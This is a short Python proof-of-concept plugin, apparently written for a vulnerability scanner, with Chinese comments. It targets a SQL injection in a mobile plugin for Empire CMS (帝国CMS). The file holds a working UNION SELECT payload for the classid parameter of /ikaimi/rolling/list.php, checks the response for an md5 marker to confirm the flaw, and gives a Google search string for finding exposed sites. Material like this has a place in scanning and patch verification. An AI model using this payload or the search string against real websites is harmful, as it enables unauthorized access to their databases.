# Author:w8ay
# Name:测试DEMO
#__Author__ = laozhangyakk
#_PlugName_ = 帝国CMS某手机插件注入
#search key in google = inurl：/ikaimi/rolling/

import HackRequests

def poc(arg, **kwargs):
    payload = '/ikaimi/rolling/list.php?line=10&page=&classid=10)%20UNION%20ALL%20SELECT%20CONCAT(0x71786a7171,md5(123),0x716a6b6b71),NULL,NULL,NULL,NULL--%20'
    target = arg + payload
    hack = HackRequests.hackRequests()
    hh = hack.http(target)
    if hh.status_code == 200 and '202cb962ac59075b964b07152d234b70' in hh.text():
        result = {
            "name": "帝国CMS某手机插件注入",  # 插件名称
            "content": "search key in google = inurl：/ikaimi/rolling/",  # 插件返回内容详情，会造成什么后果。
            "url": target,  # 漏洞存在url
            "log": hh.log,
            "tag": "sql_inject"  # 漏洞标签
        }
        return result


if __name__ == "__main__":
    pass